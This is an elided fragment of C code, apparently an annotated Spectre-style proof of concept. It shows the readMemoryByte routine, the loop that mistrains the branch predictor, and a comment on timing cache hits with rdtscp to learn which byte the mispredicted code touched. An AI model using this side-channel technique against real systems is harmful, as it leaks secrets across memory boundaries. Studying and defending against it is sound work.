...
void readMemoryByte(int cache_hit_threshold, size_t malicious_x,
  ...
  for (tries = 999; tries > 0; tries--) {
    ...
    for (j = 29; j >= 0; j--) {
      ...
      x = ((j % 6) - 1) &
          ~0xFFFF;         /* Set x=0xFFFFFFFFFFFF0000 if j%6==0, else x=0 */
    ...
    for (i = 0; i < 256; i++) {
      ...
      array so we can determine which index was cached by the malicious
      mispredicted code.

      The best way to do this is to use the rdtscp instruction, which measures
      current processor ticks, and is also serialized.
      */
